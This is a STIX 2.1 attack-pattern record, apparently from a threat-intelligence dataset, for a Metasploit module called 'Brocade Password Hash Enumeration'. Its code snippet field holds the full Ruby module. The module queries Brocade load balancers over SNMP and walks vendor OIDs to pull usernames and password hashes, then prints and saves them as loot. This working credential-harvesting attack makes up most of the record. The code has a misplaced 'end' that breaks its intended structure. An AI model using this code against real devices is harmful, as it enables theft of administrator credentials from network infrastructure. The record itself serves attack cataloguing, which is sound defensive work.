{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d60a349e-aa68-4851-ba13-04ad3f24b73c",
    "created": "2024-08-14T16:27:48.006319Z",
    "modified": "2024-08-14T16:27:48.006323Z",
    "name": "Brocade Password Hash Enumeration",
    "description": " This module extracts password hashes from certain Brocade load balancer devices.  'References'  => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/snmp/brocade_enumhash.rb",
            "external_id": "brocade_enumhash.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::SNMPClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'        => 'Brocade Password Hash Enumeration',\n      'Description' => %q{\n        This module extracts password hashes from certain Brocade load\n        balancer devices.\n      },\n      'References'  =>\n        [\n          [ 'URL', 'https://www.rapid7.com/blog/post/2014/05/15/r7-2014-01-r7-2014-02-r7-2014-03-disclosures-exposure-of-critical-information-via-snmp-public-community-string/' ]\n        ],\n      'Author'      => ['Deral \"PercentX\" Heiland'],\n      'License'     => MSF_LICENSE\n    )\n\n  end\n\n  def run_host(ip)\n    begin\n      snmp = connect_snmp\n\n      if snmp.get_value('sysDescr.0') =~ /Brocade/\n\n        @users = []\n        snmp.walk(\"1.3.6.1.4.1.1991.1.1.2.9.2.1.1\") do |row|\n          row.each { |val| @users << val.value.to_s }\n        end\n\n        @hashes = []\n        snmp.walk(\"1.3.6.1.4.1.1991.1.1.2.9.2.1.2\") do |row|\n          row.each { |val| @hashes << val.value.to_s }\n        end\n\n        print_good(\"#{ip} - Found user and password hashes:\")\n        end\n\n        credinfo = \"\"\n        @users.each_index do |i|\n        credinfo << \"#{@users[i]}:#{@hashes[i]}\" << \"\\n\"\n        print_good(\"#{@users[i]}:#{@hashes[i]}\")\n        end\n\n\n     #Woot we got loot.\n     loot_name     = \"brocade.hashes\"\n     loot_type     = \"text/plain\"\n     loot_filename = \"brocade_hashes.txt\"\n     loot_desc     = \"Brodace username and password hashes\"\n     p = store_loot(loot_name, loot_type, datastore['RHOST'], credinfo , loot_filename, loot_desc)\n\n     print_status(\"Credentials saved: #{p}\")\n     rescue ::SNMP::UnsupportedVersion\n     rescue ::SNMP::RequestTimeout\n     rescue ::Interrupt\n       raise $!\n     rescue ::Exception => e\n       print_error(\"#{ip} - Error: #{e.class} #{e}\")\n     disconnect_snmp\n     end\n  end\nend\n",
    "x_mitre_contributors": [
        "[Deral \"PercentX\" Heiland]",
        ""
    ]
}